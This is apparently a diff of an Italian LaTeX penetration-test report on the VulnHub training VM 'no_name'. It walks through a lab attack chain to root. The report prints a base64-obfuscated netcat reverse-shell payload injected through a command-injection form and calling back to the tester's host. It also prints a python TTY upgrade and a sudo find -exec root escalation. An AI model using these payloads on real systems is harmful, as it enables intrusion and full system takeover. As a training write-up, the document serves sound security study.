-L'ispezione del file nascosto \texttt{/usr/share/hidden/.passwd} ha rivelato una password archiviata in chiaro: \textbf{\texttt{haclab1234}}. Attraverso il comando \texttt{su}, il team ha effettuato il login interattivo come utente \texttt{haclabs} (\textit{Lateral Movement / User Pivoting}), estendendo i propri permessi sul sistema e recuperando la seconda flag situata nella sua directory home.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{assets/academy_photo/exploitation/exploit_part_two_tohaclabs.png}
-	\caption{Spostamento laterale verso l'utente haclabs ed estrazione della seconda flag.}
-	\label{fig:haclab_escalation}
-\end{figure}
-
-\subsection{Vertical Privilege Escalation (da haclabs a root)}
-Con l'accesso all'account \texttt{haclabs}, la priorità è passata all'enumerazione dei vettori di Privilege Escalation locale. Una delle verifiche standard consiste nel controllare i permessi di esecuzione delegata (SUDO) assegnati all'utente corrente.
-
-Eseguendo il comando \texttt{sudo -l}, è emersa una grave \textit{Security Misconfiguration}: l'utente \texttt{haclabs} è autorizzato ad eseguire il binario di sistema \texttt{/usr/bin/find} con i privilegi di \texttt{root}, senza la necessità di inserire alcuna password (\texttt{NOPASSWD}).
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{assets/academy_photo/privilegeEscalation/sudo_find.png}
-	\caption{Enumerazione dei privilegi SUDO: il binario find risulta eseguibile come root senza vincoli di password.}
-	\label{fig:sudo_l_find}
-\end{figure}
-
-Il binario \texttt{find}, se eseguito con privilegi elevati, rappresenta un vettore di attacco noto (documentato anche nel database \textit{GTFOBins}). Sfruttando il parametro \texttt{-exec}, originariamente progettato per eseguire comandi arbitrari sui file trovati, è possibile forzare il binario a generare una shell di sistema. 
-
-Poiché \texttt{find} viene invocato con \texttt{sudo}, la shell generata erediterà contestualmente i massimi privilegi amministrativi. Il team ha pertanto iniettato il seguente payload:
-
-\begin{tcolorbox}[colback=gray!10, colframe=black!70, title=Payload di Rooting (GTFOBins)]
-	\texttt{sudo -u root find . -type f -exec "/bin/bash" \textbackslash;}
-\end{tcolorbox}
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{assets/academy_photo/privilegeEscalation/root_escalation.png}
-	\caption{Sfruttamento del binario find per l'ottenimento di una shell interattiva bash con privilegi di root.}
-	\label{fig:find_exec_root}
-\end{figure}
-
-L'attacco ha avuto pieno successo, mostrando a schermo una shell interattiva \texttt{root@haclabs}. Acquisito il controllo amministrativo totale della macchina \texttt{no\_name}, il team si è spostato nella directory \texttt{/root} per catturare l'ultima flag (\texttt{flag3.txt}), completando tutti gli obiettivi (\textit{Boot2Root}) dell'ingaggio offensivo.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{assets/academy_photo/privilegeEscalation/flag3.png}
-	\caption{Accesso alla directory riservata ed estrazione della flag finale.}
-	\label{fig:root_flag_final}
-\end{figure}
-
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/netcat_base64.png}
+		\caption{Codifica in Base64 del comando di Reverse Shell tramite Netcat.}
+		\label{fig:netcat_base64}
+	\end{figure}
+	
+	Parallelamente, è stato predisposto un \textit{listener} TCP sulla macchina attaccante (\texttt{Kali Linux}) in ascolto sulla porta 2222:
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/netcat_kali_before_conn.png}
+		\caption{Configurazione del listener Netcat in attesa della connessione in ingresso.}
+		\label{fig:netcat_kali}
+	\end{figure}
+	
+	Preparato l'ambiente operativo, il payload finale di \textit{Remote Code Execution} iniettato all'interno del form web di \texttt{superadmin.php} è risultato essere il seguente:
+	
+	\begin{tcolorbox}[colback=gray!10, colframe=black!70, title=Payload RCE con bypass in Base64]
+		\texttt{192.168.238.4 | `echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnx8L2Jpbi9zaCAtaSAyPiYxfHxuYyAxOTIuMTY4LjIzOC40IDIyMjIgPi90bXAvZg==" | base64 -d`}
+	\end{tcolorbox}
+	
+	\textbf{Esito dell'attacco:}
+	L'invio del form ha causato un caricamento prolungato della pagina web, sintomo di una chiamata di sistema bloccante. Nel frattempo, sul terminale dell'attaccante si è registrata la ricezione della connessione di ritorno (\textit{call-back}), confermando l'apertura di una \textbf{Reverse Shell} sul bersaglio.
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/netcat_to_noname.png}
+		\caption{Ricezione della Reverse Shell sul terminale dell'attaccante.}
+		\label{fig:netcat_succeded}
+	\end{figure}
+	
+	La shell iniziale, essendo un processo \textit{non-TTY} instabile e priva di funzionalità come l'autocompletamento e la cronologia comandi, è stata promossa a TTY interattiva con l'ausilio dell'interprete \begin{tcolorbox}[colback=gray!10, colframe=black!70, title=TTY Upgrading via Python]
+		
+		\texttt{python -c 'import pty; pty.spawn("/bin/bash")'}
+		
+	\end{tcolorbox}
+	
+	Un \texttt{whoami} immediato sul prompt ha confermato il livello di privilegi del \textit{foothold}: l'esecuzione del comando arbitrario è avvenuta nel contesto dell'account di servizio \texttt{www-data}, l'utente sotto cui gira il demone Apache.
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/exploit_part_one_spawn_shell.png}
+		\caption{Upgrading della shell in TTY interattiva e verifica dell'identità utente (whoami).}
+		\label{fig:reverse_shell}
+	\end{figure}
+	
+	L'utente \texttt{www-data} è privo di privilegi amministrativi, ma può comunque leggere le directory pubbliche del file system. L'esplorazione di \texttt{/home} ha rivelato due account locali: \textbf{\texttt{yash}} e \textbf{\texttt{haclabs}}. Nella home directory di \texttt{yash} è stato individuato il file \texttt{flag1.txt}, leggibile dal contesto attuale; il suo contenuto fornisce un indizio per il successivo passaggio di privilegi all'utente \texttt{haclabs}, descritto nella sezione \textit{Privilege Escalation}.
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/exploit_part_one_flag1.png}
+		\caption{Identificazione delle home utente e acquisizione del contenuto del file flag1.txt.}
+		\label{fig:first_flag}
+	\end{figure}
+	
+	\section{Privilege Escalation}
+	L'accesso iniziale ottenuto in fase di Target Exploitation è limitato all'account di servizio \texttt{www-data}, privo di privilegi amministrativi. Il percorso verso \texttt{root} si è quindi articolato in due passaggi distinti: uno spostamento orizzontale verso un utente di sistema con maggiori permessi (\textit{User Pivoting}) e una successiva escalation verticale fino ai privilegi amministrativi (\textit{Rooting}).
+	
+	\subsection{User Pivoting (da www-data a haclabs)}
+	Come anticipato nella sezione precedente, il file (\texttt{flag1.txt}) nella home di \texttt{yash} contiene un indizio sull'esistenza di credenziali nascoste appartenente a quell'utente.  Seguendo le tracce lasciate nel sistema, è stato utilizzato il comando \texttt{find} per individuare tutti i file nascosti di proprietà dell'utente \texttt{yash}.
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{assets/academy_photo/exploitation/exploit_part_one_haclab_psw.png}
+		\caption{Ricerca mirata dei file di configurazione appartenenti all'utente yash.}
+		\label{fig:haclab_psw}
+	\end{figure}
+	
+	L'ispezione del file nascosto \texttt{/usr/share/hidden/.passwd} ha rivelato una password in chiaro: \textbf{\texttt{haclab1234}}, sufficiente per autenticarsi come \texttt{haclabs} tramite \texttt{su} (\textit{User Pivoting}). Nella home directory del nuovo utente è stata recuperata la seconda.
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{assets/academy_photo/exploitation/exploit_part_two_tohaclabs.png}
+		\caption{Spostamento laterale verso l'utente haclabs ed estrazione della seconda flag.}
+		\label{fig:haclab_escalation}
+	\end{figure}
+	
+	\subsection{Vertical Privilege Escalation (da haclabs a root)}
+	Acquisito il controllo dell'account \texttt{haclabs}, la priorità è passata all'enumerazione dei vettori di Privilege Escalation locale. Il primo controllo, parte di qualunque check-list standard di \textit{post-exploitation}, riguarda i permessi di esecuzione delegata configurati via \texttt{sudo}.
+	
+	Eseguendo il comando \texttt{sudo -l}, è emersa una grave \textit{Security Misconfiguration}: l'utente \texttt{haclabs} è autorizzato ad eseguire il binario di sistema \texttt{/usr/bin/find} con i privilegi di \texttt{root}, senza la necessità di inserire alcuna password (\texttt{NOPASSWD}).
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{assets/academy_photo/privilegeEscalation/sudo_find.png}
+		\caption{Enumerazione dei privilegi SUDO: il binario find risulta eseguibile come root senza vincoli di password.}
+		\label{fig:sudo_l_find}
+	\end{figure}
+	
+	Il binario \texttt{find} è esplicitamente documentato  nel database \textit{GTFOBins} ~\cite{gtfobins}. Sfruttando il parametro \texttt{-exec}, originariamente progettato per eseguire comandi arbitrari sui file trovati, è possibile forzare il binario a generare una shell di sistema.
+	
+	Poiché \texttt{find} viene invocato con \texttt{sudo}, la shell generata erediterà contestualmente i massimi privilegi amministrativi. 
+	
+	\begin{tcolorbox}[colback=gray!10, colframe=black!70, title=Payload di Rooting (GTFOBins)]
+		\texttt{sudo -u root find . -type f -exec "/bin/bash" \textbackslash;}
+	\end{tcolorbox}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{assets/academy_photo/privilegeEscalation/root_escalation.png}
+		\caption{Sfruttamento del binario find per l'ottenimento di una shell interattiva bash con privilegi di root.}
+		\label{fig:find_exec_root}
+	\end{figure}
+	
+	Il payload ha aperto una shell con prompt \texttt{root@haclabs}. Acquisito il controllo  totale della macchina \texttt{no\_name}, è stato possibile accedere  alla directory home dell'utente \texttt{/root} per catturare la terza e ultima flag (\texttt{flag3.txt}), completando tutti gli obiettivi (\textit{Boot2Root}) previsti dal \textit{Boot2Root}.
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{assets/academy_photo/privilegeEscalation/flag3.png}
+		\caption{Accesso alla directory riservata ed estrazione della flag finale.}
+		\label{fig:root_flag_final}
+	\end{figure}
+	
 	\section{Maintaining Access}
-	L'ultima fase tattica del \textit{Framework Generale per il Penetration Testing} prevede tipicamente l'installazione di un meccanismo di persistenza (\textit{backdoor}, \textit{Web Shell} o \textit{Reverse Shell} in ascolto) per mantenere il controllo del sistema compromesso nel tempo, garantendo l'accesso anche in caso di riavvio della macchina o chiusura della sessione corrente.
+	L'ultima fase del \textit{Framework Generale per il Penetration Testing} prevede tipicamente l'installazione di un meccanismo di persistenza (\textit{backdoor}, \textit{Web Shell} o \textit{Reverse Shell} in ascolto) che permetta all'attaccante di mantenere l'accesso al sistema anche dopo un riavvio o la chiusura della sessione corrente.
 	
-	Durante le valutazioni tecniche condotte dal team per l'implementazione di tale fase, sono emerse tuttavia stringenti limitazioni infrastrutturali. L'analisi della superficie di attacco ha confermato che l'unico canale di comunicazione consentito dall'esterno verso il bersaglio è la porta \textbf{80 (HTTP)}. Servizi di amministrazione remota standard, come il demone SSH (porta 22), non sono risultati in ascolto o sono bloccati a livello di firewall, precludendo l'inserimento di chiavi asimmetriche per un accesso silente (\textit{Living off the Land}).
+	Durante le valutazioni tecniche condotte dal team per l'implementazione di tale fase, sono emerse tuttavia  limitazioni infrastrutturali. L'analisi della superficie di attacco ha confermato che l'unico canale di comunicazione consentito esposto dal bersaglio è la porta \textbf{80 (HTTP)}. Servizi di amministrazione remota standard, come il demone SSH (porta 22), non sono risultati in ascolto o sono bloccati a livello di firewall, precludendo l'inserimento di chiavi pubbliche di accesso persistente.
 	
-	L'installazione di \textit{bind shell} o l'apertura di porte non standard per il mantenimento dell'accesso avrebbe generato anomalie di rete altamente rumorose, facilmente bloccate da eventuali regole di un firewall. L'unica opzione tecnicamente percorribile per garantire la persistenza sarebbe consistita nell'alterazione permanente del codice sorgente dell'applicazione web o nell'inserimento di una \textit{Web Shell} nei file di sistema.
+	L'apertura di una \textit{bind shell} su una porta non standard sarebbe stata immediatamente visibile a una qualunque scansione di rete e bloccabile da una semplice regola di firewall. L'unica strada tecnicamente percorribile sarebbe stata la modifica permanente del codice dell'applicazione web — tipicamente l'inserimento di una \textit{Web Shell} all'interno dei file PHP serviti da Apache.
 	
-	Tuttavia, soppesando i rischi in accordo con le \textit{Regole d'Ingaggio} (\textit{Rules of Engagement}), il team ha ritenuto che tale modifica fosse eccessivamente invasiva e potenzialmente lesiva per la stabilità e l'integrità del servizio web legittimo. Di conseguenza, si è stabilito di \textbf{non implementare alcun meccanismo di persistenza}. 
+	Questa scelta è stata valutata rispetto alle \textit{Rules of Engagement} fissate nel Target Scoping: l'inserimento di una Web Shell richiede una modifica permanente al codice sorgente dell'applicazione web, intervento giudicato troppo invasivo per un contesto in cui le ROE escludono esplicitamente azioni con effetti persistenti sul sistema. Si è quindi deciso di \textbf{non implementare alcun meccanismo di persistenza}.
+	Recuperata la \texttt{flag3.txt} con i privilegi di \texttt{root}, le sessioni shell attive sono state chiuse e i file temporanei creati durante l'attività (la pipe \texttt{/tmp/f} utilizzata dalla \textit{Reverse Shell}) rimossi. La macchina è stata abbandonata senza artefatti persistenti riconducibili all'attività di test.
 	
-	Acquisita la flag finale con i privilegi di \texttt{root} ed esauriti gli obiettivi dell'ingaggio, tutte le sessioni volatili sono state terminate e le tracce temporanee cancellate, abbandonando il sistema senza lasciare artefatti persistenti.
+	
+	\chapter{Conclusioni}
+	L'attività di Penetration Testing condotta sulla VM \textbf{no\_name} si è conclusa con la compromissione completa del sistema e il raggiungimento dell'obiettivo \textit{Boot2Root}: tutte e tre le flag previste dall'autore sono state recuperate. L'esercitazione ha permesso di applicare in modo integrato le otto fasi del FGPT, dalla definizione del perimetro al recupero della flag finale.
+	
+	Il percorso operativo si è articolato attraverso una catena di vulnerabilità tra loro concatenate: una OS Command Injection sull'interfaccia web \texttt{superadmin.php} ha consentito l'accesso iniziale con privilegi di \texttt{www-data}, l'esposizione in chiaro di una password in file nascosti ha permesso lo \textit{User Pivoting} verso \texttt{haclabs}, e infine una configurazione \texttt{sudo} con \texttt{NOPASSWD} sul binario \texttt{find} ha consentito il \textit{Rooting} immediato del target. Ognuno di questi passaggi è documentato nelle sezioni precedenti con i comandi eseguiti e gli output significativi raccolti, in modo da garantire la riproducibilità dell'attività.
+	
+	Al di là del risultato tecnico, alcune scelte metodologiche meritano una breve nota riepilogativa. La fase di \textit{Vulnerability Assessment} ha incluso più tool con funzioni sovrapposte (Nessus, OpenVAS, Nikto, OWASP ZAP), e la decisione di escludere ZAP dalla pipeline definitiva è stata guidata dalla volontà di mantenere una separazione netta tra fasi di analisi e di sfruttamento, coerentemente con il FGPT. Allo stesso modo, la vulnerabilità CVE-2024-47176 su CUPS, pur architetturalmente confermata, è stata classificata come non sfruttabile per impossibilità di completare la \textit{kill-chain} nelle condizioni di laboratorio. Infine, la fase di \textit{Maintaining Access} è stata volutamente non implementata in ottemperanza alle \textit{Rules of Engagement} fissate in sede di Target Scoping.
+	
+	La valutazione formale del rischio, l'analisi dettagliata delle singole vulnerabilità e le raccomandazioni di \textit{remediation} sono trattate nel documento separato \textit{Penetration Testing Report}, che accompagna questa relazione metodologica.
+	
+	%==================================================
+	%  4. BIBLIOGRAFIA
+	%==================================================
+	\cleardoublepage
+	\stepcounter{chapter} % Incrementa il contatore dei capitoli (diventa 4)
+	\addcontentsline{toc}{chapter}{\protect\numberline{\thechapter}Bibliografia} % Aggiunge il numero all'indice
+	\begin{thebibliography}{99}
+		\bibitem{vulnhub} 
+		HacLabs, \textit{no\_name: 1}, VulnHub. \\
+		\url{https://www.vulnhub.com/entry/haclabs-no_name,429/}
 		
+		\bibitem{owasp_top10} 
+		OWASP Foundation, \textit{OWASP Top 10 Web Application Security Risks}. \\
+		\url{https://owasp.org/Top10/}
 		
-\chapter{Conclusioni}
-{\Huge \textbf{MODIFICARE ASSOLUTAMENTE}}
-
-L'attività di Penetration Testing condotta sulla macchina virtuale \textbf{no\_name} ha simulato con successo un attacco mirato, portando alla compromissione totale del sistema e al raggiungimento dell'obiettivo \textit{Boot2Root}. L'analisi ha evidenziato una postura di sicurezza insufficiente, caratterizzata da vulnerabilità concatenate che spaziano da errori di configurazione architetturale a gravi falle logiche nel codice applicativo.
-
-Il punto di ingresso iniziale (\textit{Foothold}) è stato ottenuto sfruttando una vulnerabilità critica di \textbf{OS Command Injection} (CWE-78) presente nell'interfaccia \texttt{superadmin.php}. Il tentativo di mitigare il rischio tramite l'implementazione di una \textit{blacklist} si è rivelato inefficace, permettendo al team di eludere i controlli avvalendosi di tecniche di \textit{Command Substitution} e codifica in Base64 per instaurare una Reverse Shell.
-
-Successivamente, l'errata gestione dei segreti (\textit{Information Disclosure}) ha esposto in chiaro la password dell'utente di sistema all'interno di file nascosti, consentendo un agevole \textit{User Pivoting} verso l'account \texttt{haclabs}. La \textit{Privilege Escalation} verticale definitiva verso l'utente \texttt{root} è stata garantita da una severa \textit{Security Misconfiguration} relativa ai permessi SUDO: la delega di esecuzione del binario \texttt{find} in modalità \texttt{NOPASSWD} ha permesso il \textit{Rooting} istantaneo del bersaglio, evidenziando una grave violazione del Principio del Minimo Privilegio (PoLP).
-
-Il livello di rischio complessivo associato all'infrastruttura è classificato come \textbf{Critico}. Al fine di ripristinare un adeguato livello di sicurezza, si raccomandano le seguenti contromisure:
-\begin{itemize}[label=\textcolor{headerblue}{\textbf{\checkmark}}, leftmargin=*]
-	\item \textbf{Validazione dell'Input:} Sostituire l'attuale meccanismo di \textit{blacklisting} in \texttt{superadmin.php} con una più rigorosa \textit{allowlist}, validando rigorosamente il formato degli indirizzi IP forniti dall'utente prima di processarli.
-	\item \textbf{Bonifica dei Privilegi (SUDO):} Revocare immediatamente i permessi \texttt{NOPASSWD} per il binario \texttt{find} associati all'utente \texttt{haclabs}.
-	\item \textbf{Gestione dei Segreti:} Rimuovere qualsiasi traccia di password in chiaro dai file di configurazione (\texttt{.passwd}) e dai commenti del codice sorgente (es. pagina \texttt{/admin}).
-	\item \textbf{Hardening del Web Server:} Implementare le intestazioni HTTP di sicurezza mancanti (\texttt{X-Frame-Options}, \texttt{Content-Security-Policy}) per prevenire attacchi di tipo client-side (es. Clickjacking).
-\end{itemize}
-
-\cleardoublepage
-\stepcounter{chapter} % Incrementa il contatore dei capitoli (diventa 4)
-\addcontentsline{toc}{chapter}{\protect\numberline{\thechapter}Bibliografia} % Aggiunge il numero all'indice
-\begin{thebibliography}{99}
-	\bibitem{vulnhub} 
-	HacLabs, \textit{no\_name: 1}, VulnHub. \\
-	\url{https://www.vulnhub.com/entry/haclabs-no_name,429/}
+		\bibitem{wstg} 
+		OWASP Foundation, \textit{Web Security Testing Guide (WSTG)}, v4.2. \\
+		\url{https://owasp.org/www-project-web-security-testing-guide/}
+		
+		\bibitem{cwe78} 
+		MITRE Corporation, \textit{CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')}. \\
+		\url{https://cwe.mitre.org/data/definitions/78.html}
+		
+		\bibitem{gtfobins} 
+		GTFOBins, \textit{find - Sudo/SUID Abuse}. \\
+		\url{https://gtfobins.github.io/gtfobins/find/}
+		
+		\bibitem{nmap} 
+		Gordon Lyon, \textit{Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning}. \\
+		\url{https://nmap.org/book/}
+		
+		\bibitem{ptes} 
+		The Penetration Testing Execution Standard (PTES). \\
+		\url{http://www.pentest-standard.org/}
+	\end{thebibliography}
 	
-	\bibitem{owasp_top10} 
-	OWASP Foundation, \textit{OWASP Top 10 Web Application Security Risks}. \\
-	\url{https://owasp.org/Top10/}
-	
-	\bibitem{wstg} 
-	OWASP Foundation, \textit{Web Security Testing Guide (WSTG)}, v4.2. \\
-	\url{https://owasp.org/www-project-web-security-testing-guide/}
-	
-	\bibitem{cwe78} 
-	MITRE Corporation, \textit{CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')}. \\
-	\url{https://cwe.mitre.org/data/definitions/78.html}
-	
-	\bibitem{gtfobins} 
-	GTFOBins, \textit{find - Sudo/SUID Abuse}. \\
-	\url{https://gtfobins.github.io/gtfobins/find/}
-	
-	\bibitem{nmap} 
-	Gordon Lyon, \textit{Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning}. \\
-	\url{https://nmap.org/book/}
-	
-	\bibitem{ptes} 
-	The Penetration Testing Execution Standard (PTES). \\
-	\url{http://www.pentest-standard.org/}
-\end{thebibliography}
-
 \end{document}
